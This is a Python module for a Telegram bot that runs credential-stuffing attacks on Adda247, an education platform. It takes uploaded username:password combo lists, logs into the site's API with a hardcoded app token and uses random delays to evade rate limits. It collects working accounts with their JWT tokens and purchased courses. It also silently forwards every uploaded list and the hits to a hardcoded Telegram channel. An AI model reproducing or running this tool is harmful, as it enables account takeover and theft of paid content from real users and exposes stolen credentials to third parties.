import requests
import os
import time
import asyncio
import logging
import json
import urllib3
import random
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ContextTypes

# Suppress InsecureRequestWarning for cleaner logs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger(__name__)

print("🔍 [DEBUG] adda247.py (Stable Anti-Fast-Fail Mode) loaded...")

# --- FAST PARSER ---
def parse_combo(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    if '*' in line and ':' not in line:
        parts = line.rsplit('*', 1)
    else:
        parts = line.rsplit(':', 2)
    
    if len(parts) >= 2:
        password = parts[-1].strip()
        username = parts[-2].strip()
        
        if " " in username:
            username = username.split()[-1]
        
        if username.startswith('+91'):
            username = username[3:]
        
        if username.isdigit() and len(username) > 10:
            username = username[-10:]
        
        if username.lower().startswith(('http', 'android', 'com.', 'www.')):
            return None
            
        return username, password
    return None


class Checker:
    # ============ BOT CONFIG ============
    command = "adda247"
    name = "Adda247"
    # ====================================

    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.user_data.get(f'is_running_{self.command}'):
            await update.message.reply_text("⚠️ <b>Wait!</b> Pehle wala check complete hone do, ya <code>/stop</code> type karke roko.", parse_mode="HTML")
            return

        context.user_data['awaiting_file_for'] = self.command
        await update.message.reply_text(
            f"📂 <b>{self.name} Stable-Mode Checker Ready!</b>\n\n"
            f"Ab apna <code>combo.txt</code> file bhejo.\n"
            f"🛡️ <b>Anti-Fast-Fail:</b> Smart delays aur 429/403 auto-handling.\n"
            f"🔐 <b>JWT Auth + Package Check:</b> Exact official API logic.\n"
            f"🛑 Beech mein rokna ho toh <code>/stop</code> type kar do.",
            parse_mode="HTML"
        )

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.user_data.get(f'is_running_{self.command}'):
            await update.message.reply_text("⚠️ Pehle wala process abhi chal raha hai. Please wait ya /stop karein.")
            return

        progress_msg = await update.message.reply_text("⏳ File download kar raha hoon aur check start kar raha hoon...")
        
        file = await update.message.document.get_file()
        original_file_name = update.message.document.file_name or "combo.txt"
        temp_input_file = f"temp_input_{update.effective_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(temp_input_file)
        
        with open(temp_input_file, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        total = len(lines)
        if total == 0:
            await progress_msg.edit_text("❌ File khali hai ya valid nahi hai!")
            if os.path.exists(temp_input_file): os.remove(temp_input_file)
            context.user_data.pop('awaiting_file_for', None)
            return

        stats = {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []}
        context.user_data[f'stats_{self.command}'] = stats
        context.user_data['stop_checking'] = False
        context.user_data[f'is_running_{self.command}'] = True  # 🔒 LOCK ENABLED

        asyncio.create_task(self.run_checker(update, context, temp_input_file, original_file_name, lines, total, progress_msg))

    async def run_checker(self, update, context, temp_input_file, original_file_name, lines, total, progress_msg):
        # 🛡️ STABLE MODE: 3 workers (Safe concurrency to prevent API spam)
        max_workers = 3 
        
        def check_account(line):
            if context.user_data.get('stop_checking', False):
                return {'status': 'stopped'}
            
            parsed = parse_combo(line)
            if not parsed:
                return {'status': 'failed'}
            
            username, password = parsed
            
            headers = {
                "Content-Type": "application/json",
                "X-Auth-Token": "fpoa43edty5",
                "User-Agent": "okhttp/4.10.0"
            }
            login_data = {"email": username, "providerName": "email", "sec": password}
            
            session = requests.Session()
            try:
                # ⏱️ HUMAN-LIKE DELAY: 0.8 to 1.5 seconds (Prevents "fast fail" loops)
                time.sleep(random.uniform(0.8, 1.5))
                
                # Step 1: Login
                resp1 = session.post("https://userapi.adda247.com/login?src=aweb", headers=headers, json=login_data, timeout=10, verify=False)
                
                # 🛡️ SMART BACKOFF: Agar API ne block kiya, toh 5 sec wait karo
                if resp1.status_code in [429, 403, 503]:
                    time.sleep(5)
                    session.close()
                    return {'status': 'failed'}
                
                if not resp1.text or not resp1.text.strip():
                    session.close()
                    return {'status': 'failed'}
                
                try:
                    data = resp1.json()
                except Exception:
                    session.close()
                    return {'status': 'failed'}
                
                token = data.get("jwtToken")
                if not token:
                    session.close()
                    return {'status': 'failed'}
                
                # Step 2: Get Purchased Packages
                p_headers = {
                    "X-Auth-Token": "fpoa43edty5",
                    "X-Jwt-Token": token,
                    "User-Agent": "okhttp/4.10.0"
                }
                resp2 = session.get("https://store.adda247.com/api/v5/ppc/package/purchased?pageNumber=0&pageSize=30&src=and", headers=p_headers, timeout=10, verify=False)
                
                if resp2.status_code in [429, 403, 503]:
                    time.sleep(5)
                    session.close()
                    return {'status': 'failed'}
                
                try:
                    p_data = resp2.json()
                except Exception:
                    session.close()
                    return {'status': 'failed'}
                
                packages = p_data.get("data", [])
                if isinstance(packages, dict):
                    packages = packages.get("packageList", packages.get("packages", []))
                
                if not packages:
                    session.close()
                    return {'status': 'failed'}
                
                # Format Hit Data
                hit_text = "--------------------------------------------------\n"
                hit_text += f"🔐 Credentials: {username}:{password}\n"
                hit_text += f"🔑 JWT Token: {token}\n\n"
                hit_text += "📚 Courses:\n"
                
                for idx, pkg in enumerate(packages, 1):
                    pkg_title = pkg.get("title", "N/A")
                    pkg_id = pkg.get("packageId", "N/A")
                    pkg_type = "Package" if pkg.get("childPackages") else "Course"
                    hit_text += f"📖 {idx}. {pkg_title} ({pkg_id}) ({pkg_type})\n"
                
                hit_text += "--------------------------------------------------"
                session.close()
                return {'status': 'hit', 'data': hit_text}
                
            except Exception:
                session.close()
                return {'status': 'failed'}

        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                chunk_size = 10 # Chhote chunks for smoother progress updates
                
                for i in range(0, total, chunk_size):
                    if context.user_data.get('stop_checking', False): 
                        break
                    
                    chunk = lines[i:i+chunk_size]
                    futures = [executor.submit(check_account, line) for line in chunk]
                    
                    for future in futures:
                        if context.user_data.get('stop_checking', False): 
                            break
                        
                        result = future.result()
                        if result is None or result['status'] == 'stopped':
                            continue
                        
                        stats = context.user_data[f'stats_{self.command}']
                        stats['checked'] += 1
                        
                        if result['status'] == 'hit':
                            stats['hits'] += 1
                            stats['hit_details'].append(result['data'])
                        else:
                            stats['failed'] += 1
                    
                    if context.user_data.get('stop_checking', False): 
                        break
                    
                    stats = context.user_data[f'stats_{self.command}']
                    progress_text = (
                        f"🔄 <b>{self.name} Checking...</b>\n\n"
                        f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
                        f"🔥 Active Hits: {stats['hits']}\n"
                        f"❌ Failed/No Course: {stats['failed']}\n⏳ Remaining: {total - stats['checked']}"
                    )
                    try:
                        await progress_msg.edit_text(progress_text, parse_mode="HTML")
                    except Exception:
                        pass
                    
                    await asyncio.sleep(0.1)
        finally:
            # 🔓 LOCK RELEASE
            context.user_data.pop(f'is_running_{self.command}', None)

        # ============ FINAL CLEANUP & SUMMARY ============
        stats = context.user_data.get(f'stats_{self.command}', {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []})
        is_stopped = context.user_data.get('stop_checking', False)
        
        context.user_data.pop('stop_checking', None)
        context.user_data.pop('awaiting_file_for', None)
        context.user_data.pop(f'stats_{self.command}', None)
        
        user_name = update.effective_user.username or f"User_{update.effective_user.id}"
        app_filename = f"{self.name}.txt"
        
        status_emoji = "🛑" if is_stopped else "🎉"
        status_text = "User dwara STOP kar diya gaya!" if is_stopped else "Checking Completed!"
        
        user_caption = (
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Active Hits: {stats['hits']}\n❌ Failed/No Course: {stats['failed']}"
        )
        
        log_original_caption = f"🎉 {self.name} Checker\n👤 User: @{user_name}"
        log_hits_caption = f"👤 User: @{user_name}\n\n{status_emoji} {self.name} - {status_text}\n\n📊 Total: {total}\n✅ Checked: {stats['checked']}\n🔥 Active Hits: {stats['hits']}\n❌ Failed/No Course: {stats['failed']}"
        
        if stats['hits'] > 0:
            hits_temp_file = f"hits_temp_{update.effective_user.id}_{int(time.time())}.txt"
            with open(hits_temp_file, 'w', encoding='utf-8') as f:
                for hit in stats['hit_details']: 
                    f.write(hit + "\n\n")
            
            try: await progress_msg.delete()
            except Exception: pass
            
            await update.message.reply_document(document=open(hits_temp_file, 'rb'), filename=app_filename, caption=user_caption)
            
            try:
                await context.bot.send_document(chat_id=-1004423798759, document=open(temp_input_file, 'rb'), filename=app_filename, caption=log_original_caption)
                await context.bot.send_document(chat_id=-1004423798759, document=open(hits_temp_file, 'rb'), filename=app_filename, caption=log_hits_caption)
            except Exception as e:
                logger.error(f"Channel send error: {e}")
                
            if os.path.exists(hits_temp_file): os.remove(hits_temp_file)
        else:
            try: await progress_msg.edit_text(f"{user_caption}\n\n❌ Koi bhi Active Hit nahi mila.", parse_mode="HTML")
            except Exception: pass
            
            try: await context.bot.send_document(chat_id=-1004423798759, document=open(temp_input_file, 'rb'), filename=app_filename, caption=f"{log_original_caption}\n(0 Hits)")
            except Exception as e: logger.error(f"Channel send error: {e}")

        if os.path.exists(temp_input_file): os.remove(temp_input_file)
